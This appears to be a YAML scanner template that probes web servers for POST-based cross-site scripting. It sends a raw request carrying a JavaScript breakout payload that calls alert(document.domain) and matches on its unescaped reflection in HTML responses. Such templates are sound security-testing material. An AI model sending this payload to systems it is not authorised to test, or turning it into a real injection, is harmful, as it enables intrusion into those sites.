id: js-post-based-xss

info:
  name: JavaScript POST based XSS
  author: melbadry9
  severity: medium
  description: Inject into JavaScript file that read post body
  reference: https://none
  tags: xss

requests:
- raw:
  - |
    POST / HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 52

    ');alert(document.domain);setItem('request-replay','

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - "');alert(document.domain);"

  - type: word
    part: header
    words:
    - "text/html"
